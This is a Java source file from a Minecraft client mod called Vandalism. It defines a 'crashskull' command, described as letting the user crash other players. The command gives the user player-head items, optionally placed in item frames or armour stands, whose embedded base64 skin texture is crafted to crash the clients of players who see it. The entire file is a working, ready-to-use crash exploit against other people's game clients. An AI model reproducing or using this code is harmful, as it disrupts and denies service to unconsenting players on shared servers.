/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.command.impl.misc;

import com.mojang.authlib.properties.Property;
import com.mojang.authlib.properties.PropertyMap;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import de.nekosarekawaii.vandalism.feature.command.AbstractCommand;
import de.nekosarekawaii.vandalism.util.game.ItemStackUtil;
import net.minecraft.command.CommandSource;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.component.type.ProfileComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;

import java.util.Optional;

public class CrashSkullCommand extends AbstractCommand {

    private static final String CRASH_VALUE = "ewogICJ0aW1lc3RhbXAiIDogMTcyMzU2ODM1MTY1NSwKICAicHJvZmlsZUlkIiA6ICJkOGQ1YTkyMzdiMjA0M2Q4ODgzYjExNTAxNDhkNjk1NSIsCiAgInByb2ZpbGVOYW1lIiA6ICJUZXN0IiwKICAic2lnbmF0dXJlUmVxdWlyZWQiIDogdHJ1ZSwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6IG51bGwKICAgIH0KICB9Cn0=";

    public CrashSkullCommand() {
        super("Allows you to crash other players.", Category.MISC, "crashskull");
    }

    @Override
    public void build(final LiteralArgumentBuilder<CommandSource> builder) {
        for (final Type type : Type.values()) {
            final String name = type.name().toLowerCase();
            builder.then(literal(name).executes(context -> {
                switch (type) {
                    case ITEM_FRAME -> {
                        final ItemStack itemStack = new ItemStack(Items.ITEM_FRAME);
                        final NbtCompound entityData = new NbtCompound();
                        entityData.putString("id", "minecraft:item_frame");
                        final NbtCompound itemData = new NbtCompound();
                        itemData.putString("id", "minecraft:player_head");
                        itemData.putInt("count", 1);
                        final NbtCompound components = new NbtCompound();
                        final NbtCompound profile = new NbtCompound();
                        final NbtList properties = new NbtList();
                        final NbtCompound property = new NbtCompound();
                        property.putString("name", "textures");
                        property.putString("value", CRASH_VALUE);
                        properties.add(property);
                        profile.put("properties", properties);
                        components.put("minecraft:profile", profile);
                        itemData.put("components", components);
                        entityData.put("Item", itemData);
                        itemStack.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(entityData));
                        ItemStackUtil.giveItemStack(itemStack);
                    }
                    case ARMOR_STAND -> {
                        final ItemStack itemStack = new ItemStack(Items.ARMOR_STAND);
                        final NbtCompound entityData = new NbtCompound();
                        entityData.putString("id", "minecraft:armor_stand");
                        final NbtList armorItems = new NbtList();
                        for (int i = 0; i < 3; i++) {
                            armorItems.add(new NbtCompound());
                        }
                        final NbtCompound itemData = new NbtCompound();
                        itemData.putString("id", "minecraft:player_head");
                        itemData.putInt("count", 1);
                        final NbtCompound components = new NbtCompound();
                        final NbtCompound profile = new NbtCompound();
                        final NbtList properties = new NbtList();
                        final NbtCompound property = new NbtCompound();
                        property.putString("name", "textures");
                        property.putString("value", CRASH_VALUE);
                        properties.add(property);
                        profile.put("properties", properties);
                        components.put("minecraft:profile", profile);
                        itemData.put("components", components);
                        armorItems.add(itemData);
                        entityData.put("ArmorItems", armorItems);
                        itemStack.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(entityData));
                        ItemStackUtil.giveItemStack(itemStack);
                    }
                    default -> {
                        final ItemStack itemStack = new ItemStack(Items.PLAYER_HEAD);
                        final PropertyMap profile = new PropertyMap();
                        final Property textures = new Property("textures", CRASH_VALUE);
                        profile.put("textures", textures);
                        itemStack.set(DataComponentTypes.PROFILE, new ProfileComponent(Optional.empty(), Optional.empty(), profile));
                        ItemStackUtil.giveItemStack(itemStack);
                    }
                }
                return SINGLE_SUCCESS;
            }));
        }
    }

    private enum Type {
        ITEM_FRAME,
        ARMOR_STAND,
        ITEM
    }

}
